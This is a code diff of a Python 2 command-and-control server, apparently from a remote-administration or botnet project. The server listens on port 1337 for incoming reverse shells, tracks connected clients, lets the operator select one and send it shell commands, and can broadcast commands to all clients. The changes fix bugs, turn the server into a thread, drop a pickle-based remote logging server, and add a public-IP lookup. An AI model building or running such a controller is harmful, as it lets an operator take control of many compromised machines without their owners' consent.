@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 #
-xf   # Copyright (c) 2017 colental
+# Copyright (c) 2017 colental
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -83,9 +83,9 @@ Server Commands
 '''
 
 
-class Server(object):
+class Server(threading.Thread):
     global exit_status
-    def __init__(self, port=1337):
+    def __init__(self, host='0.0.0.0', port=1337):
         super(Server, self).__init__()
         self.count          = 0
         self.lock           = threading.Event()
@@ -97,10 +97,7 @@ class Server(object):
             'clients'       :   self.list_clients,
             'quit'          :   self.quit_server,
 	    'sendall'	    :   self.sendall_clients,
-            'usage'         :   self.print_help,
-            '--help'        :   self.print_help,
-            '-h'            :   self.print_help,
-            '?'             :   self.print_help
+            '--help'        :   self.print_help
             }
         self.manager        = threading.Thread(target=self.client_manager, name='client_manager')
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -176,9 +173,9 @@ class Server(object):
     def select_client(self, client_id):
         if self.lock.is_set():
             self.lock.clear()
-        if self.current_client is and self.current_client.lock.is_set():
+        if self.current_client and self.current_client.lock.is_set():
             self.current_client.lock.clear()
-        if int(client_id) in self.clients.keys():
+        if int(client_id) not in self.clients:
             print '\nInvalid Client ID\n'
             return
         self.current_client = self.clients[int(client_id)]
@@ -267,7 +264,8 @@ class Server(object):
                     self.lock.clear()
             else:
                 if not self.lock.is_set():
-                    self.lock.set()                
+                    self.lock.set()
+            self.lock.wait()
             output = ''
             cmd_buffer = raw_input('$ ')
             cmd, _, action = cmd_buffer.partition(' ')
@@ -318,68 +316,16 @@ class ClientHandler(threading.Thread):
             else:
                 if data:
                     print data
-                
-
-class LogRecordHandler(socketserver.StreamRequestHandler):
-    global debug
-    global exit_status
-
-    def handle(self):
-        while True:
-            if exit_status:
-                break
-            chunk   = self.connection.recv(4)
-            if len(chunk) < 4:
-                break
-            slen    = struct.unpack('>L', chunk)[0]
-            chunk   = self.connection.recv(slen)
-
-            while len(chunk) < slen:
-                chunk = chunk + self.connection.recv(slen - len(chunk))
-
-            obj     = pickle.loads(chunk)
-            record  = logging.makeLogRecord(obj)
-            logname = os.path.join(tempfile.gettempdir(), str(record.name)) + '.txt'
-            fp = file(logname, 'a')
-            fp.write('{} {:>20} {:>15} {}\n'.format(time.ctime(), record.name, record.submodule, record.msg))
-            fp.close()
-
-
-class LogRecordServer(socketserver.ThreadingTCPServer):
-    allow_reuse_address = 1
-
-    global exit_status
-
-    def __init__(self, host='localhost',
-                 port=4321,
-                 handler=LogRecordHandler):
-
-        socketserver.ThreadingTCPServer.__init__(self, (host, port), handler)
-        self.host    = host
-        self.port    = port
-        self.timeout = 1
-        self.logname = None
-
-    def serve_until_stopped(self):
-        while True:
-            if exit_status:
-                break
-            try:
-                rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout)
-                if rd:
-                    self.handle_request()
-            except KeyboardInterrupt:
-                break
             
 
 if __name__ == '__main__':
     print BANNER
+    p = 1337
     logging.basicConfig(format='%(asctime)s %(name)-20s %(submodule)-15s %(message)s')
-    logger  = LogRecordServer()
-    server  = Server()
-    server.run()
-    logger.serve_until_stopped()
-    print "Listening on port [%d] for reverse-shells and port [%d] for remote-logging\n" % (server_port, logger_port)
+    ip      = requests.get('http://api.ipify.org').content
+    server  = Server(port=p)
+    print "Server running on port {}...".format(p)
+    server.start()
 
 
 
